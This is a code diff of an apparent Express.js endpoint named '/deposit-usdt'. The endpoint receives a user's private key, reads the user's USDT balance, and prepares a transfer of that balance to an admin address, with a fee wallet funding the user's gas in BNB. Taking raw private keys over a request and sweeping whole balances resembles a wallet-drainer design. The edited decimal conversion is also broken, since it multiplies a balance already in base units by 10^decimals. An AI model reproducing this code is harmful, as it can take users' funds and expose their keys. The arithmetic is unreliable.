@@ -225,7 +225,6 @@ app.post("/deposit-usdt", async (req, res) => {
   }
 
   try {
-    // Fetch user account from private key
     const userAccount = web3.eth.accounts.privateKeyToAccount(userPrivateKey);
 
     // Get token balance for user
@@ -237,12 +236,13 @@ app.post("/deposit-usdt", async (req, res) => {
 
     console.log(`User's USDT Balance: ${tokenBalance}`);
 
-    // Convert balance to proper decimals
     const tokenABI = await getTokenABI(contractAddress);
     const tokenContract = new web3.eth.Contract(tokenABI, contractAddress);
 
     const tokenDecimals = await tokenContract.methods.decimals().call();
-    const balanceToSend = BigInt(tokenBalance) * BigInt(10 ** tokenDecimals);
+
+    // Convert balance to BigInt and adjust for decimals
+    const balanceToSend = BigInt(tokenBalance) * BigInt(10) ** BigInt(tokenDecimals);
 
     // Prepare transaction to send USDT from user to admin
     const transferData = tokenContract.methods
@@ -255,10 +255,11 @@ app.post("/deposit-usdt", async (req, res) => {
 
     // Fee payment setup (BNB fee from feePrivateKey)
     const feeAccount = web3.eth.accounts.privateKeyToAccount(feePrivateKey);
+
     const feeTx = {
       from: feeAccount.address,
       to: userAccount.address,
-      value: web3.utils.toWei("0.01", "ether"), // Adjust the fee amount as necessary
+      value: web3.utils.toWei("0.01", "ether"), // Adjust fee amount as necessary
       gas: 21000,
       gasPrice: gasPrice,
     };
